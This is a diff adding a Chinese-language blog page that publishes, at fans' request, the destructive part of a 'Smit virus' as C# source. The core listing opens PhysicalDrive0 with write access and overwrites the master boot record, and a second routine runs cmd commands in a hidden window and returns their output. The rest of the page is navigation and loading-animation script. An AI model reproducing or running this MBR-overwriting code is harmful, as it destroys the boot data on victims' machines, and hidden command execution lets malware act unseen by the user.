@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="https://xbodw.github.io/Resources/Feature.css">
+    <link rel="stylesheet" href="https://xbodw.github.io/Resources/code/styles/vs.min.css">
+    <link href="https://xbodw.github.io/Resources/Flutas.ico" rel="icon">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>
+	<script src="https://xbodw.github.io/Resources/code/linenumber.js"></script>
+    <meta name="xbodw.github.io" content="Flutas">
+    <title>Smit病毒竟然涉及到了MBR?|Flutas</title>
+</head>
+<body>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <div class="bk" >
+        <h2>Flutas</h2>
+        <ul class="ul_top">
+            <li><a href="/">首页</a></li>
+            <li><a href="/Download">产品</a></li>
+            <li><a style="text-decoration: underline;" href="/Docs">文档</a></li>
+            <li><a href="/feedback">帮助</a></li>
+            
+            
+        </ul>
+    </div>
+    <div class="docmain">
+    <h1>Smit病毒改mbr 源码</h1>
+    <br>
+      <span>之前smit病毒的视频很火,很多粉丝求着要这个病毒搞坏电脑部分的源代码</span>
+      <br>
+      <span>安排,必须安排!<img width="22" height="22" src="https://p3-pc-sign.douyinpic.com/obj/tos-cn-i-tsj2vxp0zn/a1dced860baf4101988d629727323095?x-expires=1997604000&amp;x-signature=w7itsAv6bPVvXWaehA%2Fd46A2MGg%3D&amp;from=876277922"></span>
+      <br>
+      <br>
+      <span>于是我就把中途改mbr和运行cmd命令的代码给放出来了。</span>
+      <br>
+      <span>该项目由C# 窗体应用程序完成,如有意编写者,请自行下载<a href="https://visualstudio.microsoft.com/">Visual Studio开发工具</a></span>
+      <br>
+	    <br>
+	    <br>
+      <span>先引用以下命名空间:</span>
+	    <br>
+      <pre>
+      <code type="csharp">
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.IO;
+using System.Xml;
+</code>
+</pre>
+      <br>
+      <br>
+      <span>随后创建一下常\变量,并Import动态链接库:</span>
+       <br>
+      <pre>
+      <code type="csharp">
+      int progress = 0;
+        int xixixi = 0;
+        byte[] MBR = new byte[512];
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+        [DllImport("kernel32.dll")]
+        private static extern bool WriteFile(int hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+        public static extern IntPtr GetDesktopWindow();
+        [DllImport("user32.dll", EntryPoint = "GetDCEx", CharSet = CharSet.Auto, ExactSpelling = true)]
+        private static extern IntPtr GetDCEx(IntPtr hWnd, IntPtr hrgnClip, int flags);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer,
+        uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
+        const uint GENERIC_READ = 0x80000000;
+        const uint GENERIC_WRITE = 0x40000000;
+        const int FILE_SHARE_READ = 0x00000001;
+        const int FILE_SHARE_WRITE = 0x00000002;
+        const int OPEN_EXISTING = 3;
+
+        [DllImport("user32.dll", EntryPoint = "SetForegroundWindow")]
+        public static extern bool SetForegroundWindow(IntPtr hWnd);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        private static extern System.IntPtr GetForegroundWindow();
+
+        // 设置此窗体为活动窗体：
+        // 激活窗口。窗口必须附加到调用线程的消息队列。
+        [DllImport("user32.dll", EntryPoint = "SetActiveWindow")]
+        public static extern IntPtr SetActiveWindow(IntPtr hWnd);
+
+        // 设置窗体位置
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        private static extern int SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int y, int Width, int Height, int flags);
+        
+        //获取硬盘分区表文件
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr CreateFile(
+        string FileName,
+        uint DesiredAccess,
+        uint ShareMode,
+        IntPtr SecurityAttributes,
+        uint CreationDisposition,
+        int FlagsAndAttributes,
+        IntPtr hTemplate
+        );
+        
+        //获取应用程序右键菜单
+        [DllImport("user32.dll", EntryPoint = "GetSystemMenu")]
+         private static extern IntPtr GetSystemMenu(IntPtr hWnd, int bRevert);
+        
+        //设置菜单项开启与关闭
+        [DllImport("User32.dll")]
+        public static extern bool EnableMenuItem(IntPtr hMenu, int uIDEnableItem, int uEnable);
+        
+        //常量
+        public const int FILE_FLAG_NO_BUFFERING = 0x20000000;
+        private const int SC_CLOSE = 0xF060;
+        private const int MF_ENABLED = 0x00000000;
+        private const int MF_GRAYED = 0x00000001;
+        private const int MF_DISABLED = 0x00000002;
+      </code>
+      </pre>
+      <br><br>
+      <span>接下来才是改mbr的重点:</span>
+      <br>
+      <pre>
+      <code>
+      private bool ChangeMbr()
+        {
+            byte[] MBR = {0x00};
+            IntPtr ra = CreateFileA("\\\\.\\PhysicalDrive0",
+                GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                (IntPtr)0,
+                OPEN_EXISTING,
+                0,
+                (IntPtr)0
+                );
+
+            int wb = 0;
+            bool x = WriteFile(
+                (int)ra,
+                MBR,
+                512,
+                ref wb,
+                (IntPtr)0
+            );
+            return x; //返回值为true表示硬盘已被修改
+        }
+      </code>
+      </pre>
+      <br><br>
+      <span>那么cmd命令是如何不黑框直接在程序里运行的呢></span>
+      <br>
+      <span>其实这就是开一个隐藏窗口,用api往里面输入文字,随后将返回的结果拿回来而已</span>
+      <br>
+      <pre>
+      <code>
+      private string ExecCmd(string cmd)
+        {
+            cmd += " & exit /b"; //确保执行完后退出
+            Process p = new Process();
+            p.StartInfo.FileName = "cmd";
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardInput = true;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.StartInfo.CreateNoWindow = true;
+            p.Start();
+            p.StandardInput.WriteLine(cmd);
+            p.StandardInput.AutoFlush = true;
+            string Opt = p.StandardOutput.ReadToEnd();
+            p.WaitForExit();
+            p.Close();
+            return Opt;
+        }
+      </code>
+      </pre>
+      <br>
+      <br>
+      <span>以上代码可以让我们修改硬盘Mbr,也可以让我们在图形化程序中执行cmd命令.(注意,修改Mbr只能在管理员模式下才能成功;cmd命令是否以管理员身份运行取决于你写的程序是不是以管理员启动决定的</span>
+      <br>
+      <span>点个关注再走吧！</span>
+	    <br>
+	    <br>
+	    <br>
+    </div>
+    <br>
+    <footer>(C) Flutas 2023 </footer>
+    <script>
+        "use script";
+//This script by Xbodw.
+//此脚本由Xbodw编写，请勿盗用!
+
+var TapPage=function(Page) {
+  window.location.pathname=path;
+}
+
+var AddElement=function(ElementName,GetElement) {
+  var result=document.createElement(ElementName);
+  GetElement.appendChild(result);
+  return result;
+}
+
+var LoadingPageLevel=function(){
+  var adder= `<div class="loading">
+  <style><style type="text/css">html,
+bocy,
+div {
+  margin: 0;
+  padding: 0;
+}
+ 
+html,
+body {
+  width: 100%;
+  height: 100%;
+}
+ 
+.loading {
+  width: 100%;
+  height: 100%;
+  position:fixed;
+  background-color: black;
+  top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+}
+ 
+.loading i {
+  margin: auto;
+  position: absolute;
+  top: calc(50% - 40px);
+  left: calc(50% - 40px);
+  width: 80px;
+  height: 80px;
+  display: block;
+}
+ 
+.loading span {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  opacity: 0;
+  color: black;
+}
+ 
+.loading span:after {
+  content: "";
+  display: block;
+  position: absolute;
+  left: 0px;
+  top: 0px;
+  width: 10px;
+  height: 10px;
+  background: var(--main, #00baff);
+  border-radius: 50%;
+}
+ 
+.loading span:nth-child(1) {
+  animation: i1 5.5s 0.2s infinite;
+}
+ 
+.loading span:nth-child(2) {
+  animation: i2 5.5s 0.4s infinite;
+}
+ 
+.loading span:nth-child(3) {
+  animation: i3 5.5s 0.6s infinite;
+}
+ 
+.loading span:nth-child(4) {
+  animation: i4 5.5s 0.8s infinite;
+}
+ 
+.loading span:nth-child(5) {
+  animation: i5 5.5s 1s infinite;
+}
+ 
+.loading span:nth-child(6) {
+  animation: i6 5.5s 1.2s infinite;
+}
+ 
+@keyframes i1 {
+  0% {
+    opacity: 1;
+    transform: rotate(190deg);
+    animation-timing-function: cubic-bezier(0.29, 0.44, 0.32, 0.74);
+  }
+  7% {
+    opacity: 1;
+    transform: rotate(300deg);
+    animation-timing-function: linear;
+  }
+  30% {
+    opacity: 1;
+    transform: rotate(450deg);
+    animation-timing-function: cubic-bezier(0.53, 0.27, 0.37, 0.81);
+  }
+  39% {
+    opacity: 1;
+    transform: rotate(645deg);
+    animation-timing-function: linear;
+  }
+  63% {
+    opacity: 1;
+    transform: rotate(800deg);
+    animation-timing-function: cubic-bezier(0.5, 0.32, 0.82, 0.54);
+  }
+  68% {
+    opacity: 1;
+    transform: rotate(920deg);
+    animation-timing-function: ease-in;
+  }
+  69% {
+    opacity: 0;
+    transform: rotate(930deg);
+  }
+}
+@keyframes i2 {
+  0% {
+    opacity: 1;
+    transform: rotate(180deg);
+    animation-timing-function: cubic-bezier(0.29, 0.44, 0.32, 0.74);
+  }
+  7% {
+    opacity: 1;
+    transform: rotate(300deg);
+    animation-timing-function: linear;
+  }
+  30% {
+    opacity: 1;
+    transform: rotate(450deg);
+    animation-timing-function: cubic-bezier(0.53, 0.27, 0.37, 0.81);
+  }
+  39% {
+    opacity: 1;
+    transform: rotate(645deg);
+    animation-timing-function: linear;
+  }
+  63% {
+    opacity: 1;
+    transform: rotate(800deg);
+    animation-timing-function: cubic-bezier(0.5, 0.32, 0.82, 0.54);
+  }
+  68% {
+    opacity: 1;
+    transform: rotate(910deg);
+    animation-timing-function: ease-in;
+  }
+  69% {
+    opacity: 0;
+    transform: rotate(920deg);
+  }
+}
+@keyframes i3 {
+  0% {
+    opacity: 1;
+    transform: rotate(170deg);
+    animation-timing-function: cubic-bezier(0.29, 0.44, 0.32, 0.74);
+  }
+  7% {
+    opacity: 1;
+    transform: rotate(300deg);
+    animation-timing-function: linear;
+  }
+  30% {
+    opacity: 1;
+    transform: rotate(450deg);
+    animation-timing-function: cubic-bezier(0.53, 0.27, 0.37, 0.81);
+  }
+  39% {
+    opacity: 1;
+    transform: rotate(645deg);
+    animation-timing-function: linear;
+  }
+  63% {
+    opacity: 1;
+    transform: rotate(800deg);
+    animation-timing-function: cubic-bezier(0.5, 0.32, 0.82, 0.54);
+  }
+  68% {
+    opacity: 1;
+    transform: rotate(900deg);
+    animation-timing-function: ease-in;
+  }
+  69% {
+    opacity: 0;
+    transform: rotate(910deg);
+  }
+}
+@keyframes i4 {
+  0% {
+    opacity: 1;
+    transform: rotate(160deg);
+    animation-timing-function: cubic-bezier(0.29, 0.44, 0.32, 0.74);
+  }
+  7% {
+    opacity: 1;
+    transform: rotate(300deg);
+    animation-timing-function: linear;
+  }
+  30% {
+    opacity: 1;
+    transform: rotate(450deg);
+    animation-timing-function: cubic-bezier(0.53, 0.27, 0.37, 0.81);
+  }
+  39% {
+    opacity: 1;
+    transform: rotate(645deg);
+    animation-timing-function: linear;
+  }
+  63% {
+    opacity: 1;
+    transform: rotate(800deg);
+    animation-timing-function: cubic-bezier(0.5, 0.32, 0.82, 0.54);
+  }
+  68% {
+    opacity: 1;
+    transform: rotate(890deg);
+    animation-timing-function: ease-in;
+  }
+  69% {
+    opacity: 0;
+    transform: rotate(900deg);
+  }
+}
+@keyframes i5 {
+  0% {
+    opacity: 1;
+    transform: rotate(150deg);
+    animation-timing-function: cubic-bezier(0.29, 0.44, 0.32, 0.74);
+  }
+  7% {
+    opacity: 1;
+    transform: rotate(300deg);
+    animation-timing-function: linear;
+  }
+  30% {
+    opacity: 1;
+    transform: rotate(450deg);
+    animation-timing-function: cubic-bezier(0.53, 0.27, 0.37, 0.81);
+  }
+  39% {
+    opacity: 1;
+    transform: rotate(645deg);
+    animation-timing-function: linear;
+  }
+  63% {
+    opacity: 1;
+    transform: rotate(800deg);
+    animation-timing-function: cubic-bezier(0.5, 0.32, 0.82, 0.54);
+  }
+  68% {
+    opacity: 1;
+    transform: rotate(880deg);
+    animation-timing-function: ease-in;
+  }
+  69% {
+    opacity: 0;
+    transform: rotate(880deg);
+  }
+}
+@keyframes i6 {
+  0% {
+    opacity: 1;
+    transform: rotate(140deg);
+    animation-timing-function: cubic-bezier(0.29, 0.44, 0.32, 0.74);
+  }
+  7% {
+    opacity: 1;
+    transform: rotate(300deg);
+    animation-timing-function: linear;
+  }
+  30% {
+    opacity: 1;
+    transform: rotate(450deg);
+    animation-timing-function: cubic-bezier(0.53, 0.27, 0.37, 0.81);
+  }
+  39% {
+    opacity: 1;
+    transform: rotate(645deg);
+    animation-timing-function: linear;
+  }
+  63% {
+    opacity: 1;
+    transform: rotate(800deg);
+    animation-timing-function: cubic-bezier(0.5, 0.32, 0.82, 0.54);
+  }
+  68% {
+    opacity: 1;
+    transform: rotate(870deg);
+    animation-timing-function: ease-in;
+  }
+  69% {
+    opacity: 0;
+    transform: rotate(880deg);
+  }
+}</style>
+    <i>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+    </i>
+</div>`;
+    var add = document.createElement('div');
+    add.innerHTML = adder;
+    document.body.appendChild(add);
+}
+
+var DeleteLoadingPageLevel= function() {
+  document.querySelector('div[class="loading"]').remove();
+}
+
+var checkm=function() {
+  var userAgentInfo=navigator.userAgent;
+        var Agents =new Array("Android","iPhone","SymbianOS","Windows Phone","iPad","iPod");
+        var flag=true;
+        for(var v=0;v<Agents.length;v++) {
+           if(userAgentInfo.indexOf(Agents[v])>0) {
+             flag=false;
+             break;
+           }
+         }
+         if(flag == false) {
+            window.location.pathname = "/AndroidNotch.html";
+         } else {
+           DeleteLoadingPageLevel();
+         }
+}
+var check=function() {
+        LoadingPageLevel();
+        setTimeout("DeleteLoadingPageLevel();", 1000 )
+}
+ 
+check();
+    </script>
+    <script>
+ hljs.initHighlightingOnLoad();
+	    hljs.initLineNumbersOnLoad();
+</script>
+</body>
+</html>
